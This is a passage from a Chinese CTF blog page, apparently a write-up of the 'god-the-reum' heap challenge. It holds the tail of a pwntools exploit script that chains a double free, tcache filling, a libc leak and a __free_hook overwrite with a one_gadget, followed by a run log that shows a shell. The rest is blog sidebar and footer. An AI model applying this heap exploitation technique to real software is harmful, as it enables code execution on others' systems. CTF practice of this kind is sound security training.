+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">prints</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'4'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">dev</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'select your choice :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'6'</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input wallet no :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'new eth :'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+create<span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0</span>
+create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1//防止合并</span>
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#free 0 all</span>
+delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#满足free条件后 double free </span>
+prints<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#leak heap</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
+heap_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>heap_addr<span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
+<span class="token comment" spellcheck="true">#填满 tcache 7 上方以填入一次 所以这里填充6次即可</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+   delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>heap_addr<span class="token punctuation">)</span>
+prints<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'ballance '</span><span class="token punctuation">)</span>
+offset <span class="token operator">=</span> <span class="token number">0x3ebc40</span>
+libc_base <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">96</span><span class="token operator">-</span>offset
+<span class="token comment" spellcheck="true">#print hex(main_arena)</span>
+gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
+
+<span class="token comment" spellcheck="true">#gdb.attach(p)</span>
+free_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
+<span class="token keyword">print</span> hex<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span>
+
+delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span>
+dev<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
+create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span> 
+create<span class="token punctuation">(</span><span class="token number">0x110</span><span class="token punctuation">)</span>
+one_gadget<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x4f322</span>
+dev<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>
+delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0x110</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<h4 id="run"><a href="#run" class="headerlink" title="run"></a>run</h4><p></p><p class="code-caption" data-lang="bash" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
+<pre class=" language-bash"><code class="language-bash">4. Show all wallets
+5. <span class="token keyword">exit</span>
+<span class="token keyword">select</span> your choice <span class="token keyword">:</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  input wallet no <span class="token keyword">:</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  how much you wanna withdraw? <span class="token keyword">:</span>
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Switching to interactive mode
+ $ <span class="token function">ls</span>
+1.py Documents       exp.py         Music     pwntools
+core Downloads       god-the-reum      Pictures  Templates
+Desktop  examples.desktop  god-the-reum.nam  PublicVideos
+$
+</code></pre>
+
+    
+
+    
+</div>
+
+
+                
+
+                <!-- Post Comments -->
+                
+                    
+                
+            </div>
+
+            <!-- Post Prev & Next Nav -->
+            <nav class="material-nav mdl-color-text--grey-50 mdl-cell mdl-cell--12-col">
+    <!-- Prev Nav -->
+    
+        <a href="/2019/02/23/TAMUctf/" id="post_nav-newer" class="prev-content">
+            <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon mdl-color--white mdl-color-text--grey-900" role="presentation">
+                <i class="material-icons">arrow_back</i>
+            </button>
+            &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+            新篇
+        </a>
+    
+
+    <!-- Section Spacer -->
+    <div class="section-spacer"></div>
+
+    <!-- Next Nav -->
+    
+</nav>
+
+        </div>
+    </div>
+
+
+
+                    
+                        <!-- Overlay For Active Sidebar -->
+<div class="sidebar-overlay"></div>
+
+<!-- Material sidebar -->
+<aside id="sidebar" class="sidebar sidebar-colored sidebar-fixed-left" role="navigation">
+    <div id="sidebar-main">
+        <!-- Sidebar Header -->
+        <div class="sidebar-header header-cover" style="background-image: url(/img/sidebar_header.png);">
+    <!-- Top bar -->
+    <div class="top-bar"></div>
+
+    <!-- Sidebar toggle button -->
+    <button type="button" class="sidebar-toggle mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" style="display: initial;" data-upgraded=",MaterialButton,MaterialRipple">
+        <i class="material-icons">clear_all</i>
+        <span class="mdl-button__ripple-container">
+            <span class="mdl-ripple">
+            </span>
+        </span>
+    </button>
+
+    <!-- Sidebar Avatar -->
+    <div class="sidebar-image">
+        <img src="/img/avatar.png" alt="iosmosis's avatar">
+    </div>
+
+    <!-- Sidebar Email -->
+    <a data-toggle="dropdown" class="sidebar-brand" href="#settings-dropdown">
+        io@bxbsec.com
+        <b class="caret"></b>
+    </a>
+</div>
+
+
+        <!-- Sidebar Navigation  -->
+        <ul class="nav sidebar-nav">
+    <!-- User dropdown  -->
+    <li class="dropdown">
+        <ul id="settings-dropdown" class="dropdown-menu">
+            
+                <li>
+                    <a href="#" target="_blank" title="Email Me">
+                        
+                            <i class="material-icons sidebar-material-icons sidebar-indent-left1pc-element">email</i>
+                        
+                        Email Me
+                    </a>
+                </li>
+            
+        </ul>
+    </li>
+
+    <!-- Homepage -->
+    
+        <li id="sidebar-first-li">
+            <a href="/">
+                
+                    <i class="material-icons sidebar-material-icons">home</i>
+                
+                主页
+            </a>
+        </li>
+        
+    
+
+    <!-- Archives  -->
+    
+        <li class="dropdown">
+            <a href="#" class="ripple-effect dropdown-toggle" data-toggle="dropdown">
+                
+                    <i class="material-icons sidebar-material-icons">inbox</i>
+                
+                    归档
+                <b class="caret"></b>
+            </a>
+            <ul class="dropdown-menu">
+            <li>
+                <a class="sidebar_archives-link" href="/archives/2019/03/">三月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2019/02/">二月 2019<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/12/">十二月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/11/">十一月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/10/">十月 2018<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/08/">八月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/07/">七月 2018<span class="sidebar_archives-count">6</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/06/">六月 2018<span class="sidebar_archives-count">5</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/05/">五月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/04/">四月 2018<span class="sidebar_archives-count">1</span></a></li><li><a class="sidebar_archives-link" href="/archives/2018/03/">三月 2018<span class="sidebar_archives-count">4</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/12/">十二月 2017<span class="sidebar_archives-count">3</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/04/">四月 2017<span class="sidebar_archives-count">2</span></a></li><li><a class="sidebar_archives-link" href="/archives/2017/03/">三月 2017<span class="sidebar_archives-count">2</span></a>
+            </ul>
+        </li>
+        
+    
+
+    <!-- Categories  -->
+    
+
+    <!-- Pages  -->
+    
+        <li>
+            <a href="/tags" title="Tags">
+                
+                    <i class="material-icons sidebar-material-icons">loyalty</i>
+                
+                Tags
+            </a>
+        </li>
+        
+            <li class="divider"></li>
+        
+    
+        <li>
+            <a href="/link" title="Links">
+                
+                    <i class="material-icons sidebar-material-icons">insert_link</i>
+                
+                Links
+            </a>
+        </li>
+        
+    
+
+    <!-- Article Number  -->
+    
+</ul>
+
+
+        <!-- Sidebar Footer -->
+        <!--
+I'm glad you use this theme, the development is no so easy, I hope you can keep the copyright, I will thank you so much.
+If you still want to delete the copyrights, could you still retain the first one? Which namely "Theme Material"
+It will not impact the appearance and can give developers a lot of support :)
+
+很高兴您使用并喜欢该主题，开发不易 十分谢谢与希望您可以保留一下版权声明。
+如果您仍然想删除的话 能否只保留第一项呢？即 "Theme Material"
+它不会影响美观并可以给开发者很大的支持和动力。 :)
+-->
+
+<!-- Sidebar Divider -->
+
+
+<!-- Theme Material -->
+
+
+<!-- Help & Support -->
+<!--
+
+-->
+
+<!-- Feedback -->
+<!--
+
+-->
+
+<!-- About Theme -->
+<!--
+
+-->
+
+    </div>
+
+    <!-- Sidebar Image -->
+    
+
+</aside>
+
+                    
+
+                    
+                        <!-- Footer Top Button -->
+                        <div id="back-to-top" class="toTop-wrap">
+    <a href="#top" class="toTop">
+        <i class="material-icons footer_top-i">expand_less</i>
+    </a>
+</div>
+
+                    
+
+                    <!--Footer-->
+<footer class="mdl-mini-footer" id="bottom">
+    
+        <!-- Paradox Footer Left Section -->
+        <div class="mdl-mini-footer--left-section sns-list">
+    <!-- Twitter -->
+    
+        <a href="https://twitter.com/iosmosis" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-twitter">
+                <span class="visuallyhidden">Twitter</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Facebook -->
+    
+        <a href="https://www.facebook.com/facebook" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-facebook">
+                <span class="visuallyhidden">Facebook</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Google + -->
+    
+        <a href="https://www.google.com/" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-gplus">
+                <span class="visuallyhidden">Google Plus</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Weibo -->
+    
+        <a href="http://weibo.com/u/5682776386" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-weibo">
+                <span class="visuallyhidden">Weibo</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Instagram -->
+    
+
+    <!-- Tumblr -->
+    
+
+    <!-- Github -->
+    
+
+    <!-- LinkedIn -->
+    
+
+    <!-- Zhihu -->
+    
+        <a href="https://www.zhihu.com/people/iosmosis" target="_blank">
+            <button class="mdl-mini-footer--social-btn social-btn footer-sns-zhihu">
+                <span class="visuallyhidden">Zhihu</span>
+            </button><!--
+     --></a>
+    
+
+    <!-- Bilibili -->
+    
+
+    <!-- Telegram -->
+    
+</div>
+
+
+        <!--Copyright-->
+        <div id="copyright">
+            Copyright&nbsp;©<script type="text/javascript">var fd = new Date();document.write("&nbsp;" + fd.getFullYear() + "&nbsp;");</script>iosmosis's blog
+        </div>
+
+        <!-- Paradox Footer Right Section -->
+
+        <!--
+        I am glad you use this theme, the development is no so easy, I hope you can keep the copyright.
+        It will not impact the appearance and can give developers a lot of support :)
+
+        很高兴您使用该主题，开发不易，希望您可以保留一下版权声明。
+        它不会影响美观并可以给开发者很大的支持。 :)
+        -->
+
+        <div class="mdl-mini-footer--right-section">
+            <div>
+                <div class="footer-develop-div">Powered by <a href="https://hexo.io" target="_blank" class="footer-develop-a">Hexo</a></div>
+                <div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" target="_blank" class="footer-develop-a">Material</a></div>
+            </div>
+        </div>
+    
+</footer>
+
+
+                    <!-- Import File -->
+
+
+    <script>lsloader.load("js/lazyload.min.js","/js/lazyload.min.js?1BcfzuNXqV+ntF6gq+5X3Q==")</script>
+    <script>lsloader.load("js/js.min.js","/js/js.min.js?oAl/+lvaqTFV31JXTmbrNA==")</script>
+
+
+
+    <script>lsloader.load("js/nprogress.js","/js/nprogress.js?pl3Qhb9lvqR1FlyLUna1Yw==")</script>
+
+
+<script type="text/ls-javascript" id="NProgress-script">
+    NProgress.configure({
+        showSpinner: true
+    });
+    NProgress.start();
+    $('#nprogress .bar').css({
+        'background': '#29d'
+    });
+    $('#nprogress .peg').css({
+        'box-shadow': '0 0 10px #29d, 0 0 15px #29d'
+    });
+    $('#nprogress .spinner-icon').css({
+        'border-top-color': '#29d',
+        'border-left-color': '#29d'
+    });
+    setTimeout(function() {
+        NProgress.done();
+        $('.fade').removeClass('out');
+    }, 800);
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- UC Browser Compatible -->
+<script>
+	var agent = navigator.userAgent.toLowerCase();
+	if(agent.indexOf('ucbrowser')>0) {
+		document.write('<link rel="stylesheet" href="/css/uc.css">');
+	   alert('由于 UC 浏览器使用极旧的内核，而本网站使用了一些新的特性。\n为了您能更好的浏览，推荐使用 Chrome 或 Firefox 浏览器。');
+	}
+</script>
+
+<!-- Window Load-->
+<script type="text/ls-javascript" id="window-load">
+    $(window).on('load', function() {
+        // Post_Toc parent position fixed
+        $('.post-toc-wrap').parent('.mdl-menu__container').css('position', 'fixed');
+    });
+</script>
+
+<!-- MathJax Load-->
+
+<script type="text/ls-javascript" id="lazy-load">
+    // Offer LazyLoad
+    queue.offer(function(){
+        $('.lazy').lazyload({
+            effect : 'show'
+        });
+    });
+
+    // Start Queue
+    $(document).ready(function(){
+        setInterval(function(){
+            queue.execNext();
+        },200);
+    });
+</script>
+
+<!-- Bing Background -->
+
+<script type="text/ls-javascript" id="Bing-Background-script">
+    queue.offer(function(){
+        $('body').attr('data-original', 'https://api.i-meto.com/bing?null');
+    });
+</script>
+
+
+<script>
+    (function(){
+        var scriptList = document.querySelectorAll('script[type="text/ls-javascript"]')
+
+        for (var i = 0; i < scriptList.length; ++i) {
+            var item = scriptList[i];
+            lsloader.runInlineScript(item.id,item.id);
+        }
+    })()
+console.log('\n %c © Material Theme | Version: 1.4.0 | https://github.com/viosey/hexo-theme-material %c \n', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;', 'color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;');
+</script>
+
+                </main>
+            </div>
+        <script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+    
+</html>
